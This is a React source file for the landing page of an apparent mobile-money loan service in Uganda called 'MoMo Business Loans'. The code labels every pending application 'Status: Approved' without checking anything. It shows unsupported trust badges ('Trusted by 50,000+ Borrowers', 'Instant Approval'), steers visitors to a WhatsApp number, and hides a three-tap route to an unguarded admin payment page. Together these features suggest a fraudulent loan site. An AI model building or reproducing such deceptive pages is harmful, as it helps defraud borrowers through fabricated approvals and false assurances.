import { useState, useEffect, useRef, MouseEvent } from 'react';
import { useNavigate } from 'react-router-dom';
import Logo from '../components/Logo';
import Footer from '../components/Footer';
import PageLoader from '../components/PageLoader';
import { getResolvedSettings } from '../lib/settings';
import { getSession, getApplication, clearSession, clearApplication, MoMoSession, LoanApplication } from '../lib/session';
import {
  Sparkles,
  ArrowRight,
  LogOut,
  FileText,
  Clock,
  Smartphone,
  Zap,
  ShieldCheck,
  Users,
} from 'lucide-react';

function LoggedInHome({
  session,
  application,
  onLogout,
}: {
  session: MoMoSession;
  application: LoanApplication | null;
  onLogout: () => void;
}) {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
      {/* Header */}
      <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
        <div className="container mx-auto max-w-5xl flex items-center justify-between">
          <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
            <Logo size="sm" />
            <span className="font-extrabold text-lg sm:text-xl tracking-tight">
              MoMo <span className="font-normal opacity-90">Business Loans</span>
            </span>
          </div>
          <div className="flex items-center gap-3">
            <span className="hidden sm:inline-block text-xs font-semibold bg-[hsl(198,100%,22%)]/10 px-2.5 py-1 rounded-full">
              {session.countryCode} {session.phone}
            </span>
            <button
              id="logout-btn"
              onClick={onLogout}
              className="flex items-center gap-1.5 bg-[hsl(198,100%,22%)] text-white px-3.5 py-1.5 rounded-xl text-xs sm:text-sm font-bold hover:bg-[hsl(198,100%,22%)]/90 transition shadow-sm"
            >
              <LogOut className="w-4 h-4" />
              <span>Log Out</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="flex-1 container mx-auto max-w-4xl px-4 py-8">
        {/* Welcome Banner */}
        <div className="bg-gradient-to-r from-[hsl(198,85%,26%)] to-[hsl(198,60%,28%)] rounded-3xl p-6 sm:p-8 mb-8 border border-[hsl(198,55%,32%)] shadow-xl relative overflow-hidden">
          <div className="relative z-10 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-6">
            <div>
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#ffcc00]/15 text-[#ffcc00] text-xs font-bold mb-3 border border-[#ffcc00]/25">
                <span>Verified MoMo Account</span>
                <span>•</span>
                <span>{session.country}</span>
              </div>
              <h1 className="text-2xl sm:text-3xl font-extrabold tracking-tight mb-2">
                Welcome back! 👋
              </h1>
              <p className="text-gray-300 text-sm sm:text-base font-medium">
                Registered Mobile: <span className="text-[#ffcc00] font-bold">{session.countryCode} {session.phone}</span>
              </p>
            </div>

            <button
              id="apply-top-btn"
              onClick={() => navigate('/apply')}
              className="w-full sm:w-auto px-6 py-3.5 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-sm sm:text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 group shrink-0"
            >
              <span>Apply for Loan</span>
              <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
            </button>
          </div>
        </div>

        {/* Existing Application Card */}
        {application ? (
          <div id="application-status-card" className="bg-[hsl(198,85%,26%)] rounded-3xl p-6 sm:p-8 mb-8 border border-[hsl(198,55%,32%)] shadow-xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-6 pb-4 border-b border-[hsl(198,55%,32%)]">
              <div className="flex items-center gap-3.5">
                <div className="w-12 h-12 rounded-2xl bg-[#ffcc00]/20 flex items-center justify-center text-[#ffcc00] shrink-0 border border-[#ffcc00]/30">
                  <FileText className="w-6 h-6" />
                </div>
                <div>
                  <h3 className="font-extrabold text-lg sm:text-xl">Your Loan Application</h3>
                  <p className="text-gray-400 text-xs sm:text-sm">
                    Submitted on {new Date(application.submittedAt).toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })}
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 bg-[#ffcc00]/15 text-[#ffcc00] px-3.5 py-1.5 rounded-full border border-[#ffcc00]/30 w-fit">
                <div className="w-2.5 h-2.5 rounded-full bg-[#ffcc00] animate-pulse" />
                <span className="text-xs sm:text-sm font-bold uppercase tracking-wide">
                  {application.status === 'withdrawn' ? 'Withdrawal Processing' : 'Status: Approved'}
                </span>
              </div>
            </div>

            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3.5 mb-6">
              <div className="bg-[hsl(198,100%,22%)] rounded-2xl p-4 border border-[hsl(198,55%,28%)]">
                <p className="text-xs text-gray-400 font-medium mb-1">Approved Amount</p>
                <p className="font-extrabold text-base sm:text-lg text-[#ffcc00]">{application.amount}</p>
              </div>
              <div className="bg-[hsl(198,100%,22%)] rounded-2xl p-4 border border-[hsl(198,55%,28%)]">
                <p className="text-xs text-gray-400 font-medium mb-1">Repayment Period</p>
                <p className="font-bold text-sm sm:text-base text-white">{application.repayment}</p>
              </div>
              <div className="bg-[hsl(198,100%,22%)] rounded-2xl p-4 border border-[hsl(198,55%,28%)]">
                <p className="text-xs text-gray-400 font-medium mb-1">Loan Purpose</p>
                <p className="font-bold text-sm sm:text-base text-white truncate">{application.purpose}</p>
              </div>
              <div className="bg-[hsl(198,100%,22%)] rounded-2xl p-4 border border-[hsl(198,55%,28%)]">
                <p className="text-xs text-gray-400 font-medium mb-1">Applicant Name</p>
                <p className="font-bold text-sm sm:text-base text-white truncate">{application.firstName} {application.lastName}</p>
              </div>
            </div>

            {application.status === 'withdrawn' ? (
              <div className="mt-4 p-4 rounded-2xl bg-amber-500/15 border border-amber-400/30 flex items-center justify-between flex-wrap gap-3">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-amber-500/20 text-[#ffcc00] flex items-center justify-center shrink-0">
                    <Clock className="w-5 h-5 animate-pulse" />
                  </div>
                  <div>
                    <h4 className="text-xs sm:text-sm font-extrabold text-white">
                      24-Hour Loan Withdrawal Queue Active
                    </h4>
                    <p className="text-[11px] text-gray-300">
                      Your funds are in the automated clearing queue. Track real-time progress.
                    </p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={() => navigate('/withdrawal-status')}
                  className="px-4 py-2.5 rounded-xl bg-[#ffcc00] text-gray-950 font-black text-xs hover:bg-[#ffcc00]/90 transition shadow-sm flex items-center gap-1.5 cursor-pointer"
                >
                  <span>Track 24hr Progress</span>
                  <ArrowRight className="w-3.5 h-3.5" />
                </button>
              </div>
            ) : (
              <div className="bg-[hsl(198,100%,22%)] rounded-2xl p-4 border border-[hsl(198,55%,28%)] flex items-center justify-between flex-wrap gap-3">
                <div className="flex items-center gap-2.5 text-xs sm:text-sm text-gray-300">
                  <Clock className="w-4 h-4 text-[#ffcc00] shrink-0" />
                  <span>Disbursement updates will be sent directly to your Mobile Money number.</span>
                </div>
                <button
                  onClick={() => navigate('/apply')}
                  className="text-xs font-bold text-[#ffcc00] hover:underline"
                >
                  Apply for another loan
                </button>
              </div>
            )}
          </div>
        ) : null}
      </main>

      <Footer />
    </div>
  );
}

function WhatsAppIcon({ className = 'w-5 h-5' }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
      <path d="M17.472 14.382c-.301-.15-1.78-.879-2.056-.98-.276-.1-.477-.15-.678.15-.201.3-.778.98-.954 1.18-.175.2-.351.226-.652.075-.301-.15-1.27-.468-2.42-1.493-.895-.798-1.5-1.784-1.676-2.085-.175-.301-.019-.464.132-.614.136-.135.301-.351.452-.527.15-.175.201-.301.301-.502.101-.2.05-.376-.025-.526-.075-.15-.678-1.635-.929-2.239-.245-.589-.494-.509-.678-.519l-.578-.01c-.201 0-.527.075-.803.376s-1.054 1.03-1.054 2.511c0 1.482 1.079 2.911 1.23 3.112.15.201 2.122 3.24 5.141 4.544.718.31 1.279.496 1.716.635.722.23 1.379.197 1.9.12.58-.087 1.78-.727 2.031-1.43.251-.703.251-1.305.176-1.43-.076-.126-.277-.201-.578-.351zM12.04 2C6.54 2 2.08 6.46 2.08 11.96c0 1.96.57 3.79 1.56 5.34L2 22l4.85-1.6c1.5 1 3.29 1.56 5.19 1.56 5.5 0 9.96-4.46 9.96-9.96C22 6.46 17.54 2 12.04 2z" />
    </svg>
  );
}

export default function LandingPage() {
  const navigate = useNavigate();
  const [session, setSessionState] = useState<MoMoSession | null>(null);
  const [application, setAppState] = useState<LoanApplication | null>(null);
  const [whatsappRaw, setWhatsappRaw] = useState(
    () => getResolvedSettings().whatsappRaw || '254780571549'
  );

  const tapCountRef = useRef(0);
  const tapTimerRef = useRef<any>(null);

  useEffect(() => {
    setSessionState(getSession());
    setAppState(getApplication());

    const updateWhatsapp = () => {
      const s = getResolvedSettings();
      if (s.whatsappRaw) setWhatsappRaw(s.whatsappRaw);
    };

    updateWhatsapp();
    window.addEventListener('momo_settings_updated', updateWhatsapp);
    window.addEventListener('storage', updateWhatsapp);

    // Fetch live WhatsApp number if configured in settings
    fetch('/api/settings')
      .then((res) => res.json())
      .then((data) => {
        if (data?.settings?.whatsappRaw) {
          setWhatsappRaw(data.settings.whatsappRaw);
        }
      })
      .catch(() => {});

    return () => {
      window.removeEventListener('momo_settings_updated', updateWhatsapp);
      window.removeEventListener('storage', updateWhatsapp);
    };
  }, []);

  const handleLogout = () => {
    clearSession();
    clearApplication();
    setSessionState(null);
    setAppState(null);
  };

  // 3-tap gesture anywhere on the screen navigates to admin settings
  const handleScreenTap = (e: MouseEvent) => {
    if ((e.target as HTMLElement).closest('button, a, input, select, textarea')) return;

    tapCountRef.current += 1;
    if (tapTimerRef.current) clearTimeout(tapTimerRef.current);

    if (tapCountRef.current >= 3) {
      tapCountRef.current = 0;
      navigate('/payment?admin=true');
    } else {
      tapTimerRef.current = setTimeout(() => {
        tapCountRef.current = 0;
      }, 1500);
    }
  };

  if (session?.loggedIn) {
    return (
      <PageLoader>
        <LoggedInHome session={session} application={application} onLogout={handleLogout} />
      </PageLoader>
    );
  }

  const whatsappMessage = 'Hello MoMo Loans! I need a loan, how can i apply.';
  const whatsappUrl = `https://wa.me/${whatsappRaw}?text=${encodeURIComponent(whatsappMessage)}`;

  return (
    <PageLoader>
      <div
        className="h-screen h-[100dvh] w-full bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-between px-4 pt-6 pb-3 sm:pt-8 sm:pb-6 select-none cursor-default overflow-hidden overscroll-none touch-pan-x"
        onClick={handleScreenTap}
        title="Tap 3 times on any empty space to access admin settings"
      >
      {/* Words starting from top of the screen with comfortable breathing room from top edge */}
      <div className="w-full max-w-2xl text-center px-2 pt-1 sm:pt-2">
        <h2 className="text-white font-extrabold text-base sm:text-xl md:text-2xl leading-snug tracking-tight">
          We provide Loans of up to Ugx 10,000,000 to people with Businesses and the employed people boost their needs.
        </h2>
      </div>

      {/* Hero Section locked within viewport */}
      <section className="w-full max-w-3xl flex flex-col items-center text-center my-auto">
        {/* WhatsApp Us Button directly above the badge */}
        <a
          id="hero-whatsapp-btn"
          href={whatsappUrl}
          target="_blank"
          rel="noopener noreferrer"
          className="inline-flex items-center gap-2 px-5 py-2 sm:py-2.5 rounded-full bg-[#25D366] hover:bg-[#20ba59] text-white font-extrabold text-xs sm:text-sm shadow-md hover:shadow-lg transition-all transform hover:-translate-y-0.5 mb-2.5 sm:mb-3 group cursor-pointer"
        >
          <WhatsAppIcon className="w-4 h-4 fill-white" />
          <span>WhatsApp Us</span>
        </a>

        {/* Badge */}
        <div className="inline-flex items-center gap-1.5 px-3 py-1 sm:px-4 sm:py-1.5 rounded-full bg-[hsl(198,80%,28%)] border border-[hsl(198,55%,35%)] text-[11px] sm:text-xs font-bold text-[#ffcc00] mb-3 sm:mb-4 shadow-xs">
          <Sparkles className="w-3.5 h-3.5" />
          <span>Fast & Affordable Mobile Money Financing in Uganda</span>
        </div>

        <Logo size="md" className="mb-3 sm:mb-4 shadow-xl" />

        <h1 className="text-2xl sm:text-3xl md:text-4xl font-extrabold tracking-tight max-w-2xl leading-tight mb-2 sm:mb-3">
          Empower Your Business with Instant <span className="text-[#ffcc00]">MoMo Loans</span>
        </h1>

        <p className="text-gray-300 text-xs sm:text-sm md:text-base max-w-xl mb-3 sm:mb-4 leading-relaxed font-medium">
          Get quick funding directly to your Mobile Money wallet in Uganda. Fast disbursements, transparent terms, and zero collateral required.
        </p>

        {/* 'Trusted by' & 'Instant Approval' Security Badges Row */}
        <div className="flex flex-wrap items-center justify-center gap-1.5 sm:gap-2 mb-3 sm:mb-4 max-w-xl px-2">
          <div className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full bg-[hsl(198,85%,26%)] border border-[hsl(198,55%,33%)] text-[10px] sm:text-xs text-gray-200 font-bold shadow-xs">
            <Zap className="w-3 h-3 text-[#ffcc00] shrink-0" />
            <span>Instant Approval</span>
          </div>
          <div className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full bg-[hsl(198,85%,26%)] border border-[hsl(198,55%,33%)] text-[10px] sm:text-xs text-gray-200 font-bold shadow-xs">
            <ShieldCheck className="w-3 h-3 text-green-400 shrink-0" />
            <span>256-Bit SSL Encrypted</span>
          </div>
          <div className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full bg-[hsl(198,85%,26%)] border border-[hsl(198,55%,33%)] text-[10px] sm:text-xs text-gray-200 font-bold shadow-xs">
            <Users className="w-3 h-3 text-blue-400 shrink-0" />
            <span>Trusted by 50,000+ Borrowers</span>
          </div>
        </div>

        {/* Action Button: Apply for Loan */}
        <div className="flex flex-col items-center justify-center gap-2 sm:gap-3 w-full sm:w-auto">
          <button
            id="hero-apply-btn"
            onClick={() => navigate('/apply')}
            className="w-full sm:w-auto px-8 sm:px-10 py-3 sm:py-3.5 rounded-full bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-sm sm:text-base hover:bg-[#ffcc00]/90 transition shadow-xl flex items-center justify-center gap-2 group cursor-pointer"
          >
            <span>Apply for Loan</span>
            <ArrowRight className="w-4 h-4 sm:w-5 sm:h-5 group-hover:translate-x-1 transition-transform" />
          </button>

          <button
            id="link-signin-btn"
            onClick={() => navigate('/signin')}
            className="text-xs sm:text-sm font-semibold text-gray-400 hover:text-white transition underline underline-offset-4 cursor-pointer pt-1"
          >
            Already registered? Sign In
          </button>
        </div>
      </section>
    </div>
    </PageLoader>
  );
}
